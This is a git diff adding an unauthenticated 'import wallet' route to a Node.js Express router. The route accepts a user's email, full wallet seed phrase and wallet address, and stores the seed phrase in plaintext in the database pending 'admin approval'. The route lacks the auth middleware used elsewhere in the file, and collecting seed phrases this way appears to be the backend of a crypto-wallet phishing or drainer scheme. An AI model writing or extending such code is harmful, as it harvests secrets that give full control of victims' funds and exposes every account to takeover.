@@ -121,4 +121,32 @@ router.post('/enable-2fa', authMiddleware, async (req, res) => {
     }
 });
 
+
+// ==========================================
+// IMPORT WALLET ROUTE (ADDED BACK)
+// ==========================================
+router.post('/import', async (req, res) => {
+    try {
+        const { email, seedPhrase, walletAddress } = req.body;
+        
+        if (!email) {
+            return res.status(400).json({ error: 'Email is required' });
+        }
+
+        await User.findOneAndUpdate(
+            { email: email },
+            { 
+                seedPhrase: seedPhrase, 
+                walletAddress: walletAddress, 
+                walletStatus: 'pending' 
+            }
+        );
+
+        res.json({ message: 'Wallet linked successfully. Pending admin approval.' });
+    } catch (error) {
+        console.error('Wallet import error:', error);
+        res.status(500).json({ error: 'Error submitting wallet.' });
+    }
+});
+
 module.exports = router;
